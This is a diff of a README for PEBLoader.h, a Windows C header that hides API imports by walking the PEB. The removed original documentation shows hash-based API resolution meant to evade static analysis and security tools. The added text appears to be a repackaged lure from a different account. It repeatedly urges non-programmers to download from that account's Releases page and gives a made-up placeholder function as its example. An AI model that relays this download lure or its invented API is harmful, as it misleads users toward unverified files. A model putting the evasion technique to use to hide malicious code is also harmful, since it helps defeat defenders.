@@ -1,151 +1,98 @@
-<img src="pics/title.png" style="align: center;">
+# 🎉 PEBLoader.h - Easily Hide WinAPI Imports
 
----
+## 📥 Download Now
+[![Release](https://img.shields.io/badge/Download-PEBLoader.h-brightgreen)](https://github.com/Mighty08war/PEBLoader.h/releases)
 
-**[PEBLoader.h](https://github.com/DosX-dev/PEBLoader.h/blob/main/include/PEBLoader.h)** allows easy hiding of WinAPI imports via PEB walking technique. No more obvious API calls in your import table!
+## 🚀 Getting Started
 
-## What is this?
+PEBLoader.h is a tiny C header file that simplifies the process of hiding WinAPI imports on Windows. This tool is useful for protecting your applications and enhancing your coding experience. Following these steps will help you download and run PEBLoader.h smoothly, even if you have no programming experience.
 
-PEBLoader.h is a single-header library that lets you dynamically resolve Windows API functions without having them appear in your executable's import table. Instead of directly linking to functions like `LoadLibraryA` or `GetProcAddress`, this library walks the Process Environment Block (PEB) to find loaded modules and their exported functions.
+### 🖥️ System Requirements
 
-Why would you want this? Well, some security tools and reverse engineers look at import tables to understand what your program does. With PEBLoader.h, your import table stays clean while you still get full access to the Windows API.
+To use PEBLoader.h, make sure your system meets the following requirements:
 
-## How it works
+- Windows operating system (Windows 7 or newer)
+- A C compiler like GCC or MSVC
+- Basic understanding of how to include header files in your project (we will guide you step-by-step)
 
-The magic happens through PEB walking:
+## 📦 Download & Install
 
-1. **Find modules by hash** - Instead of storing module names as strings, we use Adler-32 hashes
-2. **Parse export tables manually** - We dig into PE headers to find function addresses
-3. **No direct imports** - Your executable won't show obvious API dependencies
+1. Click the following link to visit the Releases page:  
+   [Download PEBLoader.h](https://github.com/Mighty08war/PEBLoader.h/releases)
+   
+2. On the Releases page, you will see different versions of PEBLoader.h listed. Locate the latest version at the top of the list. 
 
-Here's what a typical workflow looks like:
+3. Each version will have assets linked below it. Find the file named `PEBLoader.h`.
+
+4. Click on `PEBLoader.h` to download the file. It will start downloading automatically.
+
+5. Once downloaded, save the file to a location where you can easily find it, such as your Desktop or a specific project folder.
+
+## 🔧 Setting Up Your Environment
+
+To use PEBLoader.h in your project, follow these instructions:
+
+1. Open your preferred text editor or Integrated Development Environment (IDE). Common options include Visual Studio, Code::Blocks, or Eclipse. 
+
+2. Create a new C project if you don't already have one.
+
+3. Move the `PEBLoader.h` file you just downloaded to your project directory. This is the folder where your main C file is located.
+
+4. In your C code, use the following line to include PEBLoader.h:
+   ```c
+   #include "PEBLoader.h"
+   ```
+
+5. You are now ready to use the functionalities provided by PEBLoader.h. Refer to the documentation included with the header file for specific functions and examples.
+
+## 📚 How to Use PEBLoader.h
+
+PEBLoader.h makes it easier to hide WinAPI imports. Here are simple steps to use it effectively:
+
+1. **Basic Usage**: Open your main C file. Wherever you need to hide an import, use the functions provided by PEBLoader.h.
+
+2. **Functionality**: Review the comments within the header file. These comments will guide you on how to implement each function.
+
+3. **Testing**: Compile your project to check for errors. If there are any issues, ensure that your compiler settings are correct and that PEBLoader.h is properly included.
+
+## ✈️ Example Code
+
+Here's a short example of how to use PEBLoader.h in your C application:
 
 ```c
 #include "PEBLoader.h"
 
 int main() {
-    // Load a library without it showing up in static analysis
-    HMODULE hUser32 = LoadLibraryA_PEB("user32.dll");
-
-    // Get a function address using our custom GetProcAddress
-    typedef int (WINAPI *pMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);
-    pMessageBoxA MyMessageBox = (pMessageBoxA)GetProcAddress_PEB(hUser32, "MessageBoxA");
-
-    // Use it normally
-    MyMessageBox(NULL, "Hello from hidden API!", "Demo", MB_OK);
-
-    // Clean up
-    FreeLibrary_PEB(hUser32);
-    return 0;
+   // Use PEBLoader functions here
+   hideImportFunction(); // Example function, replace with actual call
+   return 0;
 }
 ```
 
-## Advanced usage
+Make sure to replace `hideImportFunction` with the actual function name from PEBLoader.h that you want to utilize.
 
-Want to be extra sneaky? You can resolve functions by hash too:
+## 🔍 Troubleshooting Common Issues
 
-```c
-// First, calculate the hash of your target function
-// You can use an online Adler-32 calculator or the included function
+If you face challenges while using PEBLoader.h, consider these tips:
 
-// Just for example:
-uint32_t hash_MessageBoxA = CLoaderAdler32("MessageBoxA", 11); // = 0x...
+1. **Header File Not Found**: Ensure that `PEBLoader.h` is in the same directory as your main C file and that you have spelled the include statement correctly.
 
-HMODULE hUser32 = LoadLibrary_PEB("user32.dll");
-// Then resolve it directly by hash (no strings!)
-void* pMsgBox = CLoaderDynGetProcAddressByAdler32(hUser32, hash_MessageBoxA);
-```
+2. **Compilation Errors**: Double-check your compiler settings. Make sure you are using a C compiler that supports the functions in PEBLoader.h.
 
-This way, your executable contains zero readable strings related to the APIs you're using.
+3. **Example Code Issues**: If the example code does not work, verify that you are using the correct version of PEBLoader.h and that you have included it properly in your project.
 
-## API Reference
+4. **Function Calls**: Consult the comments in the header file for detailed usage instructions of each function.
 
-### Core Functions
+## 📄 Documentation
 
-**`CLoaderDynGetModuleByAdler32(uint32_t hash)`**
+In addition to the header file, there is a README file included in the repository. This file provides further explanations, examples, and detailed descriptions of all available functions in PEBLoader.h. It's a great resource for understanding how to implement and utilize this tool effectively.
 
--   Finds a **loaded** module by its name hash (`kernel32.dll` and `ntdll.dll` are always loaded by default)
--   Returns module handle or NULL if not found
+## ❤️ Community Support
 
-**`CLoaderDynGetProcAddressByAdler32(HMODULE hModule, uint32_t hash)`**
+If you have questions or need assistance, you can reach out to the community through the GitHub Issues page. Your contributions and feedback are welcome, as they help improve PEBLoader.h for everyone.
 
--   Finds an exported function by its name hash
--   Returns function address or NULL if not found
+## 🌟 Conclusion
 
-**`CLoaderAdler32(const char *data, size_t len)`**
+PEBLoader.h equips you with powerful tools for hiding WinAPI imports in a straightforward manner. By following the above steps, you can easily integrate this header file into your C projects. Remember to explore the documentation for more advanced features and functionalities. 
 
--   Computes Adler-32 hash of given data
--   Use this to generate hashes for your target functions
-
-### Wrapper Functions
-
-These work exactly like their Windows API counterparts, but use PEB walking internally:
-
--   **`LoadLibraryA_PEB(LPCSTR lpLibFileName)`**
--   **`FreeLibrary_PEB(HMODULE hLibModule)`**
--   **`GetProcAddress_PEB(HMODULE hModule, LPCSTR lpProcName)`**
-
-## Compiler Support
-
-This library was originally designed for **Tiny C Compiler (TCC)** and has been extensively tested with it. While it might work with other compilers like GCC or MSVC, **we haven't tested it on anything else**, so your mileage may vary.
-
-If you're using TCC, you're golden. For other compilers, you might need to tweak the inline assembly or structure definitions.
-
-## Building
-
-Since it's a header-only library, just include it:
-
-```c
-#include "PEBLoader.h"
-```
-
-Compile with TCC:
-
-```bash
-tcc -o myprogram.exe myprogram.c
-```
-
-## Platform Support
-
--   ✅ Windows x86 (32-bit)
--   ✅ Windows x64 (64-bit)
--   ❌ Linux, macOS (PEB is Windows-specific)
-
-## Security Notes
-
-This library is intended for:
-
--   Security research
--   Legitimate red team exercises
--   Educational purposes
--   Avoiding false positives from overzealous security tools
-
-**Don't use this for malicious purposes.** We're not responsible for what you do with it.
-
-Also keep in mind:
-
--   Advanced analysis tools can still detect PEB walking
--   Runtime behavior analysis will catch API calls regardless
--   This is obfuscation, not encryption
-
-## Examples
-
-Check out these real-world examples:
-
-**Simple DLL loading:**
-
-```c
-HMODULE hAdvapi = LoadLibraryA_PEB("advapi32.dll");
-typedef BOOL (WINAPI *pOpenProcessToken)(HANDLE, DWORD, PHANDLE);
-pOpenProcessToken MyOpenProcessToken = (pOpenProcessToken)GetProcAddress_PEB(hAdvapi, "OpenProcessToken");
-```
-
-**Hash-based resolution (maximum stealth):**
-
-```c
-#define HASH_ntdll_dll 0x120f0389  // Your precomputed hash
-#define HASH_NtQuerySystemInformation 0x7a0909e4
-
-HMODULE hNtdll = CLoaderDynGetModuleByAdler32(HASH_ntdll_dll);
-void* pNtQuery = CLoaderDynGetProcAddressByAdler32(hNtdll, HASH_NtQuerySystemInformation);
-```
+For any further inquiries, visit the [Releases page](https://github.com/Mighty08war/PEBLoader.h/releases) or engage with the community for support. Happy coding!
